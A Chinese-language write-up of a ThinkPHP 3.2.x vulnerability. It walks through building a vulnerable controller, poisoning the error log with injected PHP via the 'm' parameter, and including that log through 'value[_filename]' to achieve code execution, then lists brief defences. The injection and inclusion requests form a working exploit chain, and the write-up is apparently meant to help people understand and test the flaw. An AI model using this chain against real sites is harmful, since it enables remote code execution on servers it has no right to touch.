1. 漏洞详情


ThinkPHP是一个快速、简单的基于MVC和面向对象的轻量级PHP开发框架，遵循Apache2开源协议发布，自2006年诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简代码的同时，尤其注重开发体验和易用性，并且拥有众多的原创功能和特性，为WEB应用和API开发提供了强有力的支持。


此次Thinkphp3.2版本中由于变量可控，且没有进行严格过滤，可能会导致log文件被写入恶意代码导致代码执行


影响版本 ：Thinkphp3.2.x


2. 漏洞复现


复现环境：


本机 windows11phpstudy_proThinkphp 3.2.3完整版php  5.2.17Apache 2.4.39vscode2019


2.1 环境搭建


本次复现的漏洞是thinkphp3.2.3版本，在thinkphp官网可以找到相关资源：


http://www.thinkphp.cn/download/610.html



在phpstudy面板开启Apache，将框架代码下载解压到本地网站目录即可。


在以下的一个文件中，需要调用系统提供的assign方法（此方法第一个参数必须可控）。模板渲染时使用display方法。


\Application\Home\Controller\IndexController.class.php


具体代码如下：


<?phpnamespace Home\Controller;
use Think\Controller;
class IndexController extends Controller{    public function index($value=''){        $this->assign($value);        $this->display();    }}


同时还需要创建模板文件（内容没有限制）


\Application\Home\View\Index\index.html


2.2 攻击复现


向系统日志写入恶意代码


在首页发送get请求，请求参数为：


m=--><?=phpinfo();?>



系统发生报错，可以发现这里代码成功写入日志文件。日志文件的基本路径为


\Application\Runtime\Logs\Common\ 


当然具体的文件名与日期相关



2.3 请求日志文件，代码执行


构造请求：在首页发送get请求，请求参数为：


?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_12.log



成功文件包含，且执行了日志文件中的恶意代码。

3. 防御措施


1.使用正则匹配对用户的输入进行严格过滤

2.修改默认的日志路径

3.限制url长度
